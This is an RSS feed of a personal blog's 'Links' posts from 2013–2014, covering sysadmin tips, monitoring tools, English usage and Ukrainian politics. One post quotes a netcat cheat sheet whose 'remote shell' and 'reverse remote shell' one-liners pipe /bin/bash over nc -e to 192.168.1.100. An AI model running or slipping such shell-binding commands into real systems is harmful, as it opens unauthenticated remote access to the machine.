@@ -1,0 +1,690 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>English &#8211; Ivan Pesin</title>
+	<atom:link href="/blog/tag/english/feed/" rel="self" type="application/rss+xml" />
+	<link>https://pesin.space/blog</link>
+	<description>Articles &#38; Translations</description>
+	<lastBuildDate>
+	Wed, 19 Oct 2016 02:08:18 +0000	</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>
+	hourly	</sy:updatePeriod>
+	<sy:updateFrequency>
+	1	</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=5.1.1</generator>
+	<item>
+		<title>Links: Oct 24th</title>
+		<link>/blog/2014/10/links-oct-24th/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-oct-24th</link>
+				<pubDate>Fri, 24 Oct 2014 15:48:26 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[affinity]]></category>
+		<category><![CDATA[Benford]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[Fraser]]></category>
+		<category><![CDATA[netcat]]></category>
+		<category><![CDATA[pidtree]]></category>
+		<category><![CDATA[progressbar]]></category>
+		<category><![CDATA[redis]]></category>
+		<category><![CDATA[rpm]]></category>
+		<category><![CDATA[shell]]></category>
+		<category><![CDATA[shield]]></category>
+		<category><![CDATA[Spelling]]></category>
+		<category><![CDATA[spinner]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2014/10/links-oct-24th/</guid>
+				<description><![CDATA[Computer Science is no more about computers than astronomy is about telescopes — Edsger Dijkstra Let me start this post with two very powerful articles in The Economist: Philosopher kings. Business leaders would benefit from studying great writers. This resonates a lot with me, and is easily transposed onto politics. I can&#8217;t get rid of despair [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />
+<blockquote>
+<p style="text-align: right;">Computer Science is no more about computers than astronomy is about telescopes<br />
+— Edsger Dijkstra</p>
+</blockquote>
+<p>Let me start this post with two very powerful articles in The Economist:</p>
+<ul>
+<li><a href="http://www.economist.com/news/business/21621778-business-leaders-would-benefit-studying-great-writers-philosopher-kings">Philosopher kings</a>. Business leaders would benefit from studying great writers.<br />
+This resonates a lot with me, and is easily transposed onto politics. I can&#8217;t get rid of despair how shallow and primitive our politicians are en mass; all the more lame sound our journalists referring to them as &#8216;elite&#8217;.</li>
+<li><a href="http://www.economist.com/news/leaders/21621800-digital-revolution-bringing-sweeping-change-labour-markets-both-rich-and-poor.">Wealth without workers, workers without wealth</a>. The digital revolution is bringing sweeping change to labour markets in both rich and poor worlds.<br />
+The overview of a silent revolution that is happening around us. Engaging parallels with two previous Industrial revolutions, opportunities, trends, and the role of IT knowledge in the future.</li>
+</ul>
+<h3>Technology</h3>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Benford%27s_law">Bedford&#8217;s law</a> (<a href="http://habrahabr.ru/post/240853/">here</a> in Russian), something I was unknowingly bumping into before when trying to fairly evenly split the list of hostname. First thought of splitting by first character was obviously naive as hostnames tend to follow some patterns. Then I decided to calculate some hash function on the hostname and pick the first figure. I thought that would be fairly evenly distributed, but to my surprise it wasn&#8217;t. Now I have an explanation — Benford&#8217;s law.</li>
+<li>On rpm-based system you can use following commands to restore file&#8217;s permissions and ownerships:<br />
+<pre class="crayon-plain-tag"># rpm --setperms 
+# rpm --setugids</pre>
+</li>
+<li>To reserve a CPU core for some particular process and make the scheduler avoid placing other processes on that CPU you need to use <a href="http://man7.org/linux/man-pages/man7/cpuset.7.html">cpusets</a>. There is a generic tutorial <a href="https://rt.wiki.kernel.org/index.php/CPU_shielding_using_/proc_and_/dev/cpuset">here</a> on shielding a CPU (Serge, thanks:), but it&#8217;s much more fun to use <a href="https://code.google.com/p/cpuset/">cset</a> tool. Just look how cool it is in the examples on <a href="http://stackoverflow.com/questions/11111852/how-to-shield-a-cpu-from-the-linux-scheduler-prevent-it-scheduling-threads-onto">stackoverflow</a> and in <a href="https://rt.wiki.kernel.org/index.php/Cpuset_Management_Utility/tutorial">this</a> tutorial.<br />
+<pre class="crayon-plain-tag">[zuul:cpuset-trunk]# cset shield -c 1-3
+cset: --&amp;gt; activating shielding:
+cset: moving 176 tasks from root into system cpuset...
+[==================================================]%
+cset: &quot;system&quot; cpuset of CPUSPEC(0) with 176 tasks running
+cset: &quot;user&quot; cpuset of CPUSPEC(1-3) with 0 tasks running</pre>
+</li>
+<li>Some <a href="http://wiki.bash-hackers.org/howto/edit-ed">handy information</a> on editing with <b>ed</b>, an undeservedly underused tool these days</li>
+<li>A standard way to implement Redis sharding and (!) make Redis utilise multiple cores: <a href="https://github.com/twitter/twemproxy">twemproxy</a>.</li>
+<li>Compact 100-line <a href="https://code.google.com/p/pmptools/source/browse/bin/netcat.pl">implementation of netcat</a> in perl. Works perfectly in pair with ssh ProxyCommand.</li>
+<li>HTTP/2 is coming: <a href="https://www.mnot.net/blog/2014/06/07/rfc2616_is_dead">RFC2616 is dead</a>.</li>
+<li>In the light of recent security vulnerabilities, even more useful site with instructions on web-server encryption configuration: <a href="https://cipherli.st">cipher.st</a></li>
+<li>Say &#8216;Hello&#8217; to hidepid= <a href="http://www.cyberciti.biz/faq/linux-hide-processes-from-other-users/">option in Linux</a>; a way to hide processes from other users.</li>
+<li>And as a titbit, shell niceties:
+<ul>
+<li>Progress bars and spinners: <a href="http://stackoverflow.com/questions/11592583/bash-progress-bar">here</a> and <a href="http://stackoverflow.com/questions/238073/how-to-add-a-progress-bar-to-a-shell-script">here</a>, my favourite is this:<br />
+<pre class="crayon-plain-tag"># progress 30G 9G 30
+# 30G [================&gt;.................................] 30% (9G)</pre>
+</li>
+<li>Best ever <code>pidtree</code> shell implementation (from <a href="http://superuser.com/questions/363169/ps-how-can-i-recursively-get-all-child-process-for-a-given-pid">superuser</a>):<br />
+<pre class="crayon-plain-tag">#!/bin/bash
+
+pidtree() {
+  echo -n $1 &quot; &quot;
+  for _child in $(ps -o pid --no-headers --ppid $1); do
+    echo -n $_child `pidtree $_child` &quot; &quot;
+  done
+}
+
+ps f `pidtree 4378`</pre>
+</li>
+</ul>
+</li>
+</ul>
+<h3>English</h3>
+<ul>
+<li><a href="http://www.nationsonline.org/oneworld/international-spelling-alphabet.htm">International Spelling Alphabet</a> for reference. I do prefer &#8216;Yellow&#8217; over &#8216;Yankee&#8217;, &#8216;Zebra&#8217; over &#8216;Zulu&#8217;, and &#8216;Water&#8217; over &#8216;Wiskey&#8217;. :-)</li>
+<li>Nice <a href="http://www.sixthsense.ru/proverbs/?SHOWALL_1=1">table of proverb equivalence</a> in Russian and English</li>
+</ul>
+<hr />
+<p><center><br />
+<iframe width="625" height="469" src="https://www.youtube.com/embed/nqQIKHPHXhc?feature=oembed" frameborder="0" allowfullscreen></iframe><br />
+</center></p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: Jun 3</title>
+		<link>/blog/2014/06/links-jun-3/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-jun-3</link>
+				<pubDate>Tue, 03 Jun 2014 12:05:36 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[bash]]></category>
+		<category><![CDATA[cfengine]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[expect]]></category>
+		<category><![CDATA[lavabit]]></category>
+		<category><![CDATA[monitoring]]></category>
+		<category><![CDATA[thinking]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2014/06/links-jun-3/</guid>
+				<description><![CDATA[Writing is nature&#8217;s way of telling you how sloppy your thinking is.  Technology: Shocking post-mortem from Joyent: operator mistake and a tool which reboots the whole datacenter without requesting additional confirmation. Defensive BASH programming &#8212; an excellent post on scripting techniques! Thinking for programmers by Leslie Lamport. The epigraph comes from this talk. The best expect script [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />
+<blockquote><p>Writing is nature&#8217;s way of telling you how sloppy your thinking is.</p></blockquote>
+<h3> Technology:</h3>
+<ul>
+<li><a href="http://www.joyent.com/blog/postmortem-for-outage-of-us-east-1-may-27-2014">Shocking post-mortem</a> from Joyent: operator mistake and a tool which reboots the whole datacenter without requesting additional confirmation.</li>
+<li><a href="http://www.kfirlavi.com/blog/2012/11/14/defensive-bash-programming/">Defensive BASH programming</a> &#8212; an excellent post on scripting techniques!</li>
+<li><a href="http://channel9.msdn.com/Events/Build/2014/3-642">Thinking for programmers</a> by <a href="http://en.wikipedia.org/wiki/Leslie_Lamport">Leslie Lamport</a>. The epigraph comes from this talk.</li>
+<li><a href="http://www.security-portal.cz/clanky/expect-script-which-can-execute-commands-multiple-servers-ssh">The best expect script</a> I found to execute commands on servers remotely via ssh. This is really handy when one does not have key-based authentication set up. The downside is that it&#8217;s slow, so one need to parallelise it if one has over few dozen of servers to crawl.</li>
+<li><a href="http://www.ncf.io">ncf</a> &#8212; CFEngine framework for small installations, runs in pure CFEngine language, to help structure your CFEngine policy and provide reusable, single purpose components distributed under the GPLv3 license.</li>
+<li>The same guys are behind <a href="http://www.rudder-project.org/site/">the Rudder</a> &#8212; web-driven, role-based solution for IT Infrastructure Automation &amp; Compliance.</li>
+<li>&#8220;Law of Murphy for devops: if thing can able go wrong, is mean is already wrong but you not have Nagios alert of it yet&#8221;. Therefore, don&#8217;t forget to monitor <a href="http://word.bitly.com/post/74839060954/ten-things-to-monitor">these things</a>.</li>
+<li>Interesting <a href="http://blog.dataloop.io/2014/01/30/what-we-learnt-talking-to-60-companies-about-monitoring/">stats</a> on monitoring tools &#8212; Nagios is the king, Sensu and Zabbix have a large chunk of large deployments.</li>
+</ul>
+<h3>English:</h3>
+<ul>
+<li><a href="http://stilldrinking.org/programming-sucks">Hilarious story</a> about why programming sucks. Careful and exact observations put in a lively and funny language. It definitely made my day!</li>
+<li><a href="http://theweek.com/article/index/256169/aunt-adult-pajama-why-cant-we-agree-how-to-pronounce-common-words">Quirks</a> with pronunciation of some borrowed words:<br />
+<blockquote><p>Another word that the British Anglicized from French is harass and its related noun harassment. They shifted the accent to the first syllable, sounding like &#8220;harris.&#8221; The Americans preferred the French-style second-syllable stress, no doubt further encouraged by the double s. But the British style is becoming more popular with people who don&#8217;t want to sound like they&#8217;re saying &#8220;her ass&#8221; — sort of like how the British &#8220;urine-us&#8221; pronunciation of Uranus, based on the Latin and Greek stress pattern, is sometimes preferred by Americans who don&#8217;t like how the American say-it-like-it-looks version sounds like &#8220;your anus.&#8221;</p></blockquote>
+</li>
+<li>Stop new wordage? Never gonna happen. <a href="http://stancarey.wordpress.com/2014/02/06/in-defence-of-unnecessary-words/">In defence of unnecessary words</a>.</li>
+<li>Corporate speak &#8212; <a href="http://www.economist.com/blogs/prospero/2014/02/corporate-speak-0">speaking strategically</a> without a strategy.</li>
+</ul>
+<hr />
+<blockquote><p>As languages go, English is particularly extreme in differentiating between stressed and unstressed syllables; the stressed syllables play a disproportionately big role in making words identifiable, and because unstressed syllables are out of the spotlight, and don’t contribute much to the exact identity of words, it doesn’t really matter exactly what they sound like. For example, some people pronounce the first syllable of believe as /bɪ/, others as /bə/, and in fact it would often be hard to tell exactly which vowel sound is used. Even if you use a different one – if you say, for example, /bʊ/ or /be/ – the identity of the word will be clear; the important thing is to pronounce the stressed second syllable with a clear /iː/ vowel.</p></blockquote>
+<p style="text-align: right;">&#8212; <a href="http://www.macmillandictionaryblog.com/schwa-syllables-and-words-in-different-guises-part-1">http://www.macmillandictionaryblog.com/schwa-syllables-and-words-in-different-guises-part-1</a></p>
+<h3>Other:</h3>
+<p><a href="http://lavabit.com">The story</a> behind lavabit shut down.</p>
+<hr />
+<p><center><br />
+<iframe width="625" height="352" src="https://www.youtube.com/embed/h_bX0T76X8U?feature=oembed" frameborder="0" allowfullscreen></iframe><br />
+</center></p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: Feb 16</title>
+		<link>/blog/2014/02/links-feb-16/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-feb-16</link>
+				<pubDate>Sun, 16 Feb 2014 15:47:49 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[blockade]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[flapjack]]></category>
+		<category><![CDATA[java]]></category>
+		<category><![CDATA[limoncelli]]></category>
+		<category><![CDATA[monitoring]]></category>
+		<category><![CDATA[nagios]]></category>
+		<category><![CDATA[sensu]]></category>
+		<category><![CDATA[syscalls]]></category>
+		<category><![CDATA[systemd]]></category>
+		<category><![CDATA[systemtap]]></category>
+		<category><![CDATA[vector]]></category>
+		<category><![CDATA[was]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2014/02/links-feb-16/</guid>
+				<description><![CDATA[Change of plan! Will now try to write shorter posts but more often. With bigger posts, if I miss a date, they start to scare me off writing them as I know that would require substantial time investment. Recently I have discovered how once never-failing task prioritisation strategy can backfire. You most certainly know the [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />Change of plan! Will now try to write shorter posts but more often. With bigger posts, if I miss a date, they start to scare me off writing them as I know that would require substantial time investment.</p>
+<p>Recently I have discovered how once never-failing task prioritisation strategy can backfire. You most certainly know the strategy: an interesting, engaging, and enjoyable task should be stashed and used as a treat after one sorts out boring or urgent assignments.</p>
+<p>You&#8217;d wonder how this could possibly go wrong? Here&#8217;s what happened with me: one of the tasks, which I long wanted to implement myself, was finally approved and assigned to me with low priority. I revelled and carefully set it aside so I could come back to it with enough time to do it neat and proper. Alas! For the next three (!) weeks, due to routine, urgent, and other business, I haven&#8217;t got enough time to tackle it.</p>
+<p>Eventually, the task received medium priority and I had to implement it within certain time constraints. This obviously meant it wasn&#8217;t as neat as I wanted it to be; this also meant it wasn&#8217;t a treat anymore! Broken hopes and bad mood instead of delight and satisfaction! Horrible experience, beware. Now I&#8217;m trying to get back to it and rework the way I would at least be content with.</p>
+<p>Okay, let&#8217;s shove in some of the interesting links I came across last month:</p>
+<h2>Other:</h2>
+<p><a href="http://everythingsysadmin.com/2013/12/avoiding-the-cost-center-menta.html?utm_source=feedburner&amp;utm_medium=feed&amp;utm_campaign=Feed%3A+EverythingSysadmin+%28Everything+Sysadmin%29">Tom Limoncelli referred</a> an interesting article that defines five stages of how management, owners, and investors treat IT in their businesses:</p>
+<ol>
+<li>Cost center</li>
+<li>Service Provider</li>
+<li>IT Partner</li>
+<li>Business Peer</li>
+<li>Business Game Changer</li>
+</ol>
+<p>Implication is the further stage you&#8217;re in, the better it is. It struck me though that some firms actually may advance in a backward direction! I would not want to stay with the firm that made more than one step backwards (one step might be a coincidence, two &#8212; a pattern).</p>
+<p>Why would someone writing in Python and Ruby want to learn Java? Here&#8217;s an explanation: <a href="http://devopsanywhere.blogspot.co.uk/2013/11/why-im-learning-java.html">Why I&#8217;m Learning Java</a>.</p>
+<h2>Technology:</h2>
+<ul>
+<ul>
+<li>Valuable bookmark: how to count and quantify the number of syscalls a program makes? Here&#8217;s <a href="https://access.redhat.com/site/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/SystemTap_Beginners_Guide/syscallsbyprocpidsect.html">an example using SystemTap</a>.</li>
+<li>Very good explanation why systemd raises so many questions and fires heated debate &#8212; <a href="http://ewontfix.com/14/">systemd: broken by design</a>.</li>
+<li><a href="https://github.com/instructure/vector">Vector</a> &#8212; an interesting tool for predictive scaling and flexible downscaling of your AWS environments.</li>
+<li><a href="http://blockade.readthedocs.org">Blockade</a> &#8212; a <span style="line-height: 1.5em;">utility for testing network failures and partitions in distributed applications.</span></li>
+<li>Provocatively titled post &#8216;<a href="http://word.bitly.com/post/74839060954/ten-things-to-monitor">10 things we forgot to monitor</a>&#8216; lists some of the things you shouldn&#8217;t be missing in your monitoring. Included mostly for scripts examples.</li>
+<li><a href="http://flapjack.io">Flapjack</a> &#8212; monitoring notification routing + event processing system. More details on <a href="http://fractio.nl/2014/01/03/the-how-and-why-of-flapjack/">how and why</a> and <a href="http://fractio.nl/2014/02/12/data-driven-alerting-with-flapjack-puppet-hiera/">a live demo</a>.</li>
+<li>Very expressive presentation on how to build a modern monitoring subsystem:</li>
+</ul>
+</ul>
+<p><center><br />
+<iframe style="border: 1px solid #CCC; border-width: 1px 1px 0; margin-bottom: 5px; max-width: 100%;" src="http://www.slideshare.net/slideshow/embed_code/31168250" height="356" width="427" allowfullscreen="" frameborder="0" marginwidth="0" marginheight="0" scrolling="no"></iframe></center>&nbsp;</p>
+<div style="margin-bottom: 5px;" align="center"><a title="Stop using Nagios (so it can die peacefully)" href="https://www.slideshare.net/superdupersheep/stop-using-nagios-so-it-can-die-peacefully" target="_blank">Stop using Nagios (so it can die peacefully)</a> from <strong><a href="http://www.slideshare.net/superdupersheep" target="_blank">Andy Sykes</a></strong></div>
+<p>&nbsp;</p>
+<h2>English</h2>
+<ul>
+<li><a href="http://www.theguardian.com/media/mind-your-language/2014/jan/31/mind-your-language-no-english-words">The Guardian&#8217;s article</a> dwelling on language devices summarising a relatively complex concept in a single word.</li>
+<li>Language purism seems to be an omnipresent phenomenon. The Economist&#8217;s article describing <a href="http://www.economist.com/blogs/prospero/2014/01/english-purism">purism in English language</a>.</li>
+<li>Yet another post on reduplications: <a href="http://www.macmillandictionaryblog.com/willy-nilly-word-development">willy-nilly word development</a>.</li>
+<li>Few ways of saying <a href="http://www.macmillandictionaryblog.com/life-skills-tip-of-the-week-ways-of-saying-i-dont-know">&#8220;I don&#8217;t know&#8221;</a>.</li>
+</ul>
+<hr>
+Seems I&#8217;ve failed to make this post short. Have so many interesting things in my drafts that it&#8217;s challenging to stop once started. Will improve next time. That&#8217;ll be all for today, folks.</p>
+<p><span style="line-height: 1.5em;"> </span></p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: Jan 19th</title>
+		<link>/blog/2014/01/links-jan-19th/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-jan-19th</link>
+				<pubDate>Sat, 18 Jan 2014 22:15:50 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[301]]></category>
+		<category><![CDATA[algorithms]]></category>
+		<category><![CDATA[auditd]]></category>
+		<category><![CDATA[Avatar]]></category>
+		<category><![CDATA[AWS]]></category>
+		<category><![CDATA[bootstrap]]></category>
+		<category><![CDATA[centos]]></category>
+		<category><![CDATA[data structures]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[LXC]]></category>
+		<category><![CDATA[Murphy]]></category>
+		<category><![CDATA[nc]]></category>
+		<category><![CDATA[netcat]]></category>
+		<category><![CDATA[open space]]></category>
+		<category><![CDATA[redirect]]></category>
+		<category><![CDATA[Ukraine]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2014/01/links-jan-19th/</guid>
+				<description><![CDATA[&#160; Okay, you&#8217;d think Murphy laws were jokes. But as situation in Ukraine shows most of them are true, aren&#8217;t they? If something can go wrong, it will. Left to themselves, things tend to go from bad to worse. When things just can&#8217;t get any worse, they will. All of this really saddens me and [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />&nbsp;</p>
+<p>Okay, you&#8217;d think Murphy laws were jokes. But as situation in Ukraine shows most of them are true, aren&#8217;t they?</p>
+<ul>
+<li><a href="http://www.economist.com/news/leaders/21591589-viktor-yanukovych-has-made-his-choice-his-country-has-chosen-otherwise-goodbye-putin?zid=307&amp;ah=5e80419d1bc9821ebe173f4f0f060a07">If something can go wrong, it will.</a></li>
+<li><a href="http://www.economist.com/blogs/easternapproaches/2014/01/ukraine?zid=307&amp;ah=5e80419d1bc9821ebe173f4f0f060a07">Left to themselves, things tend to go from bad to worse</a>.</li>
+<li><a href="http://www.economist.com/news/europe/21594340-viktor-yanukovychs-government-still-faces-proteststhough-smaller-ones-still-out-there">When things just can&#8217;t get any worse, they will</a>.</li>
+</ul>
+<p>All of this really saddens me and spoils good faith in further; but it does demonstrate the essence of real world and people&#8217;s desires. Turning though from harsh reality to wonders of virtual world, let&#8217;s start with few reminder links:</p>
+<ul>
+<li>How to see <a href="http://www.cyberciti.biz/tips/linux-audit-files-to-see-who-made-changes-to-a-file.html">what made changes</a> to a file using <b>auditd:</b></li>
+</ul>
+<blockquote><p>
+</p><pre class="crayon-plain-tag"># auditctl -w /etc/passwd -p war -k password-file
+# ausearch -f /etc/passwd</pre><p>
+</p></blockquote>
+<ul>
+<li>netcat <a href="http://injustfiveminutes.com/2013/11/19/netcat-cheat-sheet/">cheat sheet</a>:</li>
+</ul>
+<blockquote><p>Suppose you want to transfer a file &#8220;file.txt&#8221; from server A to client B.<br />
+<code>Server: $ nc -l 4444 &lt; file.txt<br />
+</code><code>Client: $ nc -n 192.168.1.100 4444 &gt; file.txt</code></p>
+<p>Suppose you want to transfer a file &#8220;file.txt&#8221; from client B to server A:<br />
+<code>Server: $ nc -l 4444 &gt; file.txt<br />
+Client: $ nc 192.168.1.100 4444 &lt; file.txt</code></p>
+<p>Remote shell:<br />
+<code>Server: $ nc -l 4444 -e /bin/bash -i<br />
+Client: $ nc 192.168.1.100 4444</code></p>
+<p>Reverse remote shell:<br />
+<code>Server: $ nc -l 4444<br />
+Client: $ nc 192.168.1.100 4444 -e /bin/bash</code></p></blockquote>
+<h3>Technology:</h3>
+<ul>
+<li>CentOS Project <a href="http://lists.centos.org/pipermail/centos-announce/2014-January/020100.html">joins forces</a> with Red Hat! Yay!</li>
+<li>I&#8217;m an SA. I hate 301 redirects. Here&#8217;s <a href="http://getluky.net/2010/12/14/301-redirects-cannot-be-undon/">why</a>. There&#8217;s also few ideas how to undo some of the harm.</li>
+<li>Basic <a href="http://cstheory.stackexchange.com/questions/19759/core-algorithms-deployed/19773?utm_content=bufferacb4a&amp;utm_source=buffer&amp;utm_medium=twitter&amp;utm_campaign=Buffer#19773">Data Structures and Algorithms</a> in the Linux kernel.</li>
+<li><a href="http://www.reddit.com/r/IAmA/comments/1e5o4p/iaman_exaws_engineer_ask_me_anything_about_the/">Ex-AWS engineer on AWS internals</a>, extremely interesting (thanks Serge!)</li>
+<li>Wonderful <a href="http://containerops.org/2013/11/19/lxc-networking/?utm_content=buffer9a57f&amp;utm_source=buffer&amp;utm_medium=twitter&amp;utm_campaign=Buffer">article on LXC</a> and the way its networking is organised.</li>
+<li>Very nice <a href="http://www.blacktie.co">free bootstrap themes</a>.</li>
+<li><a href="https://www.tbray.org/ongoing/When/201x/2014/01/01/Software-in-2014">Software in 2014</a> &#8212; <a href="https://www.tbray.org/ongoing/When/201x/2011/12/27/Type-Systems">Bánffy-Bray criteria</a> for selecting between static and dynamic type systems, everything over HTTP and concurrent, mobile and browser suck, and the client-side is a mess.</li>
+</ul>
+<h3>English:</h3>
+<ul>
+<li>For collection &#8212; <a href="https://www.maths.nottingham.ac.uk/personal/ibf/some.html">Murphy&#8217;s laws</a></li>
+<li><a href="http://www.economist.com/blogs/johnson/2010/09/word_inflation">Dead, or living too well</a>? Is linguistic inflation <a href="http://www.macmillandictionaryblog.com/is-linguistic-inflation-insanely-awesome">insanely awesome</a>?</li>
+<li><a href="http://www.macmillandictionaryblog.com/five-rules-of-thumb-for-polite-and-diplomatic-language">Five Rules of Thumb</a> for Polite and Diplomatic Language.</li>
+</ul>
+<h3>Other:</h3>
+<ul>
+<li>Physicist Lawrence Krauss gives a talk on our current picture of the universe, how it will end, and how it could have come from nothing. Very thrilling talk on cosmology:</li>
+</ul>
+<blockquote><p><center><br />
+<iframe width="625" height="352" src="https://www.youtube.com/embed/EjaGktVQdNg?feature=oembed" frameborder="0" allowfullscreen></iframe><br />
+</center></p></blockquote>
+<ul>
+<li>Open offices are an unfortunate misunderstanding. <a href="http://www.newyorker.com/online/blogs/currency/2014/01/the-open-office-trap.html">New Yorker</a>:</li>
+</ul>
+<blockquote><p>The open office was <a href="http://dwp.bigplanet.com/pdkconsulting/nss-folder/pdfdownloads1/New_DuffyTanis1993.pdf" target="_blank">originally conceived</a> by a team from Hamburg, Germany, in the nineteen-fifties, to facilitate communication and idea flow. But a growing body of evidence suggests that the open office undermines the very things that it was designed to achieve. In <a href="http://eab.sagepub.com/content/34/3/279" target="_blank">June, 1997,</a> a large oil and gas company in western Canada asked a group of psychologists at the University of Calgary to monitor workers as they transitioned from a traditional office arrangement to an open one. The psychologists assessed the employees’ satisfaction with their surroundings, as well as their stress level, job performance, and interpersonal relationships before the transition, four weeks after the transition, and, finally, six months afterward. The employees <strong>suffered according to every measure</strong>: the new space was disruptive, stressful, and cumbersome, and, instead of feeling closer, coworkers felt distant, dissatisfied, and resentful. Productivity fell.</p></blockquote>
+<p><span style="line-height: 1.5em;">When the Avatar was first released I was appalled by claims that it was touted as &#8216;totally original work from the mind of Cameron&#8217;. I was sure that many years ago I read strikingly similar story by some of well-known sci-fi writers, but was struggling to remember the name of either the novel or the author. There was the same paraplegic hero who telepathically connected with an artificially created life form in order to explore a harsh planet and get access to its resources. Doesn&#8217;t it sound similar to the Avatar&#8217;s plot?</span></p>
+<p>Recently I accidentally stumbled upon this novel &#8212; that was Poul Anderson&#8217;s <a href="http://en.wikipedia.org/wiki/Call_Me_Joe">Call Me Joe</a>, written in (!) 1957. This is a classic sci-fi masterpiece and I would recommend reading it any time.</p>
+]]></content:encoded>
+										</item>
+		<item>
+		<title>Links: Dec 24</title>
+		<link>/blog/2013/12/links-dec-24/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=links-dec-24</link>
+				<pubDate>Tue, 24 Dec 2013 20:49:26 +0000</pubDate>
+		<dc:creator><![CDATA[ivan]]></dc:creator>
+				<category><![CDATA[Links]]></category>
+		<category><![CDATA[acoustic cryptanalysis]]></category>
+		<category><![CDATA[AWS]]></category>
+		<category><![CDATA[cfengine]]></category>
+		<category><![CDATA[English]]></category>
+		<category><![CDATA[high traffic]]></category>
+		<category><![CDATA[lviv]]></category>
+		<category><![CDATA[Maidan]]></category>
+		<category><![CDATA[mobile]]></category>
+		<category><![CDATA[nginx]]></category>
+		<category><![CDATA[promise theory]]></category>
+		<category><![CDATA[redid]]></category>
+		<category><![CDATA[RSA]]></category>
+		<category><![CDATA[salary]]></category>
+		<category><![CDATA[web history]]></category>
+		<category><![CDATA[Yaremche]]></category>
+		<category><![CDATA[yum]]></category>
+
+		<guid isPermaLink="false">https://pesin.space/blog/2013/12/links-dec-24/</guid>
+				<description><![CDATA[Just when you think you’ve sorted things out it appears the whole world gone mad :-) Ukraine has got its next Maindan (that’s how we call a nation-wide protest here) and the time is even more scarce than it was. Here are few links to sum up and give you the taste: Goodbye, Putin The [&#8230;]]]></description>
+								<content:encoded><![CDATA[<p id="top" />Just when you think you’ve sorted things out it appears the whole world gone mad :-) Ukraine has got its next Maindan (that’s how we call a nation-wide protest here) and the time is even more scarce than it was. Here are few links to sum up and give you the taste:</p>
+<ul>
+<li><a href="http://www.economist.com/news/leaders/21591589-viktor-yanukovych-has-made-his-choice-his-country-has-chosen-otherwise-goodbye-putin">Goodbye, Putin</a></li>
+<li><a href="http://www.economist.com/news/europe/21591642-viktor-yanukovychs-botched-crackdown-protests-maidan-seemed-defy-common-sense">The birth of the nation?</a></li>
+<li><a href="http://www.economist.com/news/europe/21591897-under-its-current-government-ukraine-may-be-prize-not-worth-winning-putins-expensive-victory">Putin’s expensive victory</a></li>
+<li><a href="http://www.economist.com/blogs/easternapproaches/2013/12/ukraine-0">Scenes from Maindan</a></li>
+<li><a href="http://www.theguardian.com/world/2013/dec/15/ukraine-protests-analysis-two-nations">Ukraine: tale of two nations for country locked in struggle over whether to face east or west</a></li>
+<li><a href="http://www.theguardian.com/world/2013/dec/15/ukraine-protesters-return-central-kiev-eu-campaign">Ukraine protesters return en masse to central Kiev for pro-EU campaign</a></li>
+<li><a href="http://www.theguardian.com/world/2013/dec/17/ukraine-russia-leaders-talks-kremlin-loan-deal">Vladimir Putin offers Ukraine financial incentives to stick with Russia</a></li>
+</ul>
+<p>Some other, more conventional news:</p>
+<h2>Technology</h2>
+<ul>
+<li><a href="http://highscalability.com/blog/2013/12/16/22-recommendations-for-building-effective-high-traffic-web-s.html">22 recommendations</a> for building effective high-traffic web-sites. Concentrated knowledge and experience, very nice</li>
+<li><a href="http://highscalability.com/blog/2013/11/5/10-things-you-should-know-about-aws.html">10 things</a> you should know about AWS – time saving tips</li>
+<li><a href="http://blog.zachorr.com/nginx-setup/">Battle-ready Nginx</a> – a brief overview with explanations of some settings that can be tuned in order to improve Nginx performance.</li>
+<li>Reflections on <a href="http://blog.ingineering.it/post/67370710404/turning-requirements-into-promises">turning requirements into promises</a> and <a href="http://blog.ingineering.it/post/67444144353/scaling-agile-projects-using-promises">scaling agile projects using promises</a></li>
+<li>4k bit RSA keys being cracked by <a href="http://www.extremetech.com/extreme/173108-researchers-crack-the-worlds-toughest-encryption-by-listening-to-the-tiny-sounds-made-by-your-computers-cpu">acoustic cryptanalysis</a>, totally mad and scary world!</li>
+<li>yum now keeps the <a href="http://www.cyberciti.biz/faq/yum-history-command/">history</a> of its transactions, available with <code>yum history</code></li>
+<li>Link from the past: <a href="http://evolutionofweb.appspot.com/#/growth/day">Evolution of the web</a></li>
